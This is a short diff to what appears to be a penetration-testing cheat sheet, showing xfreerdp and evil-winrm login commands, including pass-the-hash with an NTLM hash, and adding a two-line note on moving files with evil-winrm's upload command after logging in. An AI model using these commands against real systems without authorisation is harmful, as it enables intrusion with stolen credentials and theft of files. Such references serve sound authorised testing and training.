@@ -74,6 +74,8 @@ xfreerdp /u:username /p:'password' /v:<target>
 evil-winrm -i <target> -u user -p pass
 evil-winrm -i <target> -u user -p pass -S  # port 5986 (SSL)
 evil-winrm -i <target> -u user -H <ntlmhash>  # pass the hash\
+# Once logged in, download files with:
+> upload [local path] [attacker path]
 
 
 SMB:
